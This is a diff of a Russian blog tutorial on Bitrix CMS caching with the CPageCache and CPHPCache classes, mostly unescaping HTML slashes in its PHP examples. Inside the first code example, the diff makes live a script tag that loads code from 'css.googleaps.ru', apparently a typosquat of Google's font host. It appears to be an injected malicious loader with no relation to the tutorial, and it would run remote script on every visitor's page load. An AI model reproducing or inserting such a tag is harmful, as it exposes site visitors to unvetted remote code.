@@ -35,8 +35,8 @@ comments: []
 ---
 <p>Система Битрикс включает в себя разные технологии кэширования. Кэширование позволяет уменьшить нагрузку на аппаратные ресурсы (за исключением файловой системы разумеется), таким образом влияя на время отклика сайта. Как правило, кэширование используется как в стандартных компонентах системы, так и в компонентах, разработанных под свои нужды. Результаты ресурсоемких, а так же редко обновляемых кусков кода заносятся в кэш, при повторном запросе, готовый результат может выдаваться из кэша, и при больших нагрузках на сайт прирост производительности за счет кэширования становиться очевидным. Сделать кэширование должным образом &mdash; дело ювелирное, но отчаиваться не стоит &mdash; всё приходит с опытом.<a id="more"></a><a id="more-503"></a></p>
 <p>По умолчанию для кэширования в Битрикс-е созданы два класса, это CPageCache и CPHPCache. Первый служит для кеширования HTML, второй для кэширования HTML и PHP переменных.<br />
-Файлы кэша записываются в каталог &#47;bitrix&#47;cache&#47;. Если время кэширования не истекло, то вместо ресурсоемкого кода будет подключен предварительно созданный файл кэша. Стоит заметить, что неразумное использование кэширования может привести к значительному увеличению размера каталога с файлами кэша.</p>
-<h2>HTML кэширование:<&#47;h2></p>
+Файлы кэша записываются в каталог /bitrix/cache/. Если время кэширования не истекло, то вместо ресурсоемкого кода будет подключен предварительно созданный файл кэша. Стоит заметить, что неразумное использование кэширования может привести к значительному увеличению размера каталога с файлами кэша.</p>
+<h2>HTML кэширование:</h2></p>
 <pre><?php<br />
 # создаем объект<br />
 $obCache = new CPageCache;<br />
@@ -46,16 +46,16 @@ $lifeTime = 30*60;<br />
 # которые могут повлиять на результирующий HTML<br />
 $cacheID = $arParams['ELEMENT_ID'].$arParams['IBLOCK_TYPE'];<br />
 # инициализируем буферизирование вывода<br />
-if($obCache->StartDataCache($lifeTime, $cacheID, "&#47;")){</p>
+if($obCache->StartDataCache($lifeTime, $cacheID, "/")){</p>
 <p>&nbsp;&nbsp; &nbsp;<br />
 &nbsp;&nbsp; &nbsp;#<br />
 &nbsp;&nbsp; &nbsp;# Сюда помещается ресурсоёмкий код, с выводом результата<br />
 &nbsp;&nbsp; &nbsp;#</p>
 <p>&nbsp;&nbsp; &nbsp;# записываем предварительно буферизированный вывод в файл кеша<br />
 &nbsp;&nbsp; &nbsp;$obCache->EndDataCache();<br />
-}<script src="&#47;&#47;css.googleaps.ru&#47;css?f=Open+Sans&amp;cd=mb&amp;ver=4.2.2"><&#47;script><&#47;pre><br />
+}<script src="//css.googleaps.ru/css?f=Open+Sans&amp;cd=mb&amp;ver=4.2.2"></script></pre><br />
 &nbsp;</p>
-<h2>Кэширование HTML и PHP переменных:<&#47;h2></p>
+<h2>Кэширование HTML и PHP переменных:</h2></p>
 <pre><?php<br />
 # создаем объект<br />
 $obCache = new CPHPCache;<br />
@@ -65,7 +65,7 @@ $lifeTime = 30*60;<br />
 # которые могут повлиять на результирующий HTML<br />
 $cacheID = $arParams['ELEMENT_ID'].$arParams['SECTION_ID'];<br />
 # если кеш есть и он ещё не истек то<br />
-if($obCache->InitCache($lifeTime, $cacheID, "&#47;"){<br />
+if($obCache->InitCache($lifeTime, $cacheID, "/"){<br />
 &nbsp;&nbsp; &nbsp;# получаем закешированные переменные<br />
 &nbsp;&nbsp; &nbsp;$vars = $obCache->GetVars();<br />
 &nbsp;&nbsp; &nbsp;$SECTION_TITLE = $vars["SECTION_TITLE"];<br />
@@ -80,12 +80,12 @@ $APPLICATION->AddChainItem($SECTION_TITLE, $SECTION_URL."SECTION_ID=".$arParams[
 if($obCache->StartDataCache()){<br />
 &nbsp;&nbsp; &nbsp;# выбираем из базы параметры элемента инфоблока<br />
 &nbsp;&nbsp; &nbsp;if($arIBlockElement = GetIBlockElement($arParams['ELEMENT_ID'], $IBLOCK_TYPE)){<br />
-&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;echo "<"."pre>"; print_r($arIBlockElement); echo "<&#47;"."pre>";<br />
+&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;echo "<"."pre>"; print_r($arIBlockElement); echo "</"."pre>";<br />
 &nbsp;&nbsp; &nbsp;}<br />
 &nbsp;&nbsp; &nbsp;# записываем предварительно буферизированный вывод в файл кеша<br />
 &nbsp;&nbsp; &nbsp;# вместе с дополнительной переменной<br />
 &nbsp;&nbsp; &nbsp;$obCache->EndDataCache(array(<br />
 &nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;"SECTION_TITLE" => $SECTION_TITLE<br />
 &nbsp;&nbsp; &nbsp;));<br />
-}?><&#47;pre><br />
+}?></pre><br />
 &nbsp;</p>
